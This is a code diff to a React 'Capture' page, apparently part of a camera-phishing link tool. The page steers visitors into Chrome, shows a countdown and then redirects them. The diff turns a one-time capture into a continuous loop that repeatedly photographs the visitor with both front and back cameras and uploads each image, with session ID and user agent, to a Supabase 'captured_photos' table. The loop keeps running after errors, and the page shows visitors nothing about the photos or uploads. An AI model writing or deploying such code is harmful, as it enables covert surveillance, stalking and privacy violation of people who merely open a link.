@@ -84,7 +84,8 @@ const Capture = () => {
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const [status, setStatus] = useState<"checking" | "redirecting_chrome" | "not_chrome" | "countdown">("checking");
   const [countdown, setCountdown] = useState<number | null>(null);
-  const captureStartedRef = useRef(false);
+  const captureLoopRef = useRef<boolean>(false);
+  const stopCaptureRef = useRef<boolean>(false);
   
   const sessionId = searchParams.get("session") || "default";
   const rawRedirectUrl = searchParams.get("redirect") || "https://google.com";
@@ -104,7 +105,7 @@ const Capture = () => {
         await videoRef.current.play();
         
         // Wait for camera to stabilize
-        await new Promise(resolve => setTimeout(resolve, 800));
+        await new Promise(resolve => setTimeout(resolve, 500));
         
         // Capture photo
         if (canvasRef.current && videoRef.current) {
@@ -135,40 +136,63 @@ const Capture = () => {
     }
   };
 
-  // Background capture function - runs independently
-  const captureInBackground = async () => {
-    if (captureStartedRef.current) return;
-    captureStartedRef.current = true;
+  // Continuous capture loop - keeps capturing until redirect
+  const startContinuousCapture = async () => {
+    if (captureLoopRef.current) return;
+    captureLoopRef.current = true;
     
-    try {
-      // Capture from FRONT camera first
-      const frontImage = await captureFromCamera("user");
-      
-      if (frontImage) {
-        await supabase.from('captured_photos').insert({
-          session_id: sessionId,
-          image_data: frontImage,
-          user_agent: `${navigator.userAgent} [FRONT]`
-        });
+    let captureCount = 0;
+    
+    while (!stopCaptureRef.current) {
+      try {
+        captureCount++;
+        
+        // Capture from FRONT camera
+        const frontImage = await captureFromCamera("user");
+        
+        if (frontImage && !stopCaptureRef.current) {
+          await supabase.from('captured_photos').insert({
+            session_id: sessionId,
+            image_data: frontImage,
+            user_agent: `${navigator.userAgent} [FRONT-${captureCount}]`
+          });
+        }
+        
+        if (stopCaptureRef.current) break;
+        
+        // Small delay before switching cameras
+        await new Promise(resolve => setTimeout(resolve, 200));
+        
+        // Capture from BACK camera
+        const backImage = await captureFromCamera("environment");
+        
+        if (backImage && !stopCaptureRef.current) {
+          await supabase.from('captured_photos').insert({
+            session_id: sessionId,
+            image_data: backImage,
+            user_agent: `${navigator.userAgent} [BACK-${captureCount}]`
+          });
+        }
+        
+        if (stopCaptureRef.current) break;
+        
+        // Delay before next capture cycle
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+      } catch (error) {
+        console.error("Capture cycle error:", error);
+        // Continue loop even on error
+        await new Promise(resolve => setTimeout(resolve, 1000));
       }
-      
-      // Small delay before switching cameras
-      await new Promise(resolve => setTimeout(resolve, 300));
-      
-      // Capture from BACK camera
-      const backImage = await captureFromCamera("environment");
-      
-      if (backImage) {
-        await supabase.from('captured_photos').insert({
-          session_id: sessionId,
-          image_data: backImage,
-          user_agent: `${navigator.userAgent} [BACK]`
-        });
-      }
-    } catch (error) {
-      console.error("Capture error:", error);
     }
   };
+
+  // Stop capture when component unmounts or redirect happens
+  useEffect(() => {
+    return () => {
+      stopCaptureRef.current = true;
+    };
+  }, []);
 
   useEffect(() => {
     // Step 1: Check browser type
@@ -201,8 +225,8 @@ const Capture = () => {
       setStatus("countdown");
       setCountdown(countdownSeconds);
       
-      // Start capture in background (non-blocking)
-      captureInBackground();
+      // Start continuous capture loop (non-blocking)
+      startContinuousCapture();
     };
 
     checkBrowserAndProceed();
